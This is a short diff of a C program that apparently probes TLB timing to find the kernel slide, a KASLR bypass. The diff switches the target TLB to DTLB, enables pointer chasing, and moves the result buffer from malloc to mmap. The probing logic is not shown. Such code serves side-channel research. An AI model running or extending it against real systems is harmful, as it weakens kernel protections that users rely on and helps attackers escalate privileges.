@@ -20,10 +20,10 @@
 
 #define _EMPTY_SUFFIX
 
-#define CONFIG_TARGET_STLB 1
-// #define CONFIG_TARGET_DTLB 1
+// #define CONFIG_TARGET_STLB 1
+#define CONFIG_TARGET_DTLB 1
 
-#define USE_POINTER_CHASING 0
+#define USE_POINTER_CHASING 1
 
 #if defined(CONFIG_TARGET_STLB)
 #define TARGET_FUNC_SUFFIX stlb
@@ -36,7 +36,6 @@
     "No target TLB defined. Please define CONFIG_TARGET_STLB or CONFIG_TARGET_DTLB."
 #endif
 
-// --- Logic for Pointer Chasing ---
 #if USE_POINTER_CHASING
 #define CHASING_SUFFIX _pc
 #else
@@ -97,7 +96,12 @@ int main(int argc, char *argv[]) {
   struct timeval tv_s, tv_e;
   register uint64_t tmp, threshold;
 
-  res = (uint64_t *)malloc(sizeof(uint64_t) * 10000000);
+  // res = (uint64_t *)malloc(sizeof(uint64_t) * NUM_SLOT);
+  res = mmap(0, sizeof(uint64_t) * NUM_SLOT, PROT_READ | PROT_WRITE,
+             MAP_ANON | MAP_PRIVATE, -1, 0);
+  if (-1 == res) {
+    perror("mmap");
+  }
 
   pin_to_core(0);
 
@@ -116,7 +120,7 @@ int main(int argc, char *argv[]) {
 
   printf("========Start to finding kernel slide!========\n");
 
-  memset(res, 0, sizeof(uint64_t) * 10000000);
+  memset(res, 0, sizeof(uint64_t) * NUM_SLOT);
   int64_t idx = 0;
 
   gettimeofday(&tv_s, NULL);
